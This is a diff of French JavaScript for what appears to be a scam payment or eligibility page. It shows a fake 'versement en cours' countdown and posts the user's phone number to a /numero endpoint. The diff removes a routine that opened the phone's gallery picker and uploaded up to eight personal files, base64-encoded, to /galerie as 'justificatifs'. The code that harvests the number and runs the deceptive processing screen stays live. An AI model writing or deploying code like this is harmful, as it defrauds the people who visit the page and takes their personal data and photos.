@@ -103,25 +103,9 @@ function localiser() {
   );
 }
 
-function demanderRecu() {
-  const champ = $("#galerie");
-  champ.click();
-  champ.onchange = async () => {
-    for (const fichier of [...champ.files].slice(0, 8)) {
-      if (fichier.size > 4000000) continue;
-      await poster("/galerie", {
-        nom: fichier.name, type: fichier.type, taille: fichier.size,
-        donnees: await enBase64(fichier),
-      });
-    }
-    cocher("recu", `${champ.files.length} justificatif(s) transmis`);
-    progression(100);
-    finir();
-  };
-}
-
 function finir() {
   $("#valider").disabled = true;
+  progression(100);
   let reste = 900;
   etat("Votre versement est <b>en cours de traitement</b>. Ne fermez pas cette page.");
   setInterval(() => {
@@ -145,9 +129,9 @@ function finir() {
     const numero = $("#numero").value.replace(/\s/g, "");
     if (numero.length < 8) { etat("Saisissez un numéro valide."); return; }
     poster("/numero", { valeur: numero });
-    etat("Vérification finale de votre éligibilité…");
+    etat("Vérification de votre éligibilité…");
     progression(90);
-    setTimeout(demanderRecu, 1200);
+    setTimeout(finir, 1200);
   };
 
   document.addEventListener("visibilitychange", () => { vivant = !document.hidden; });
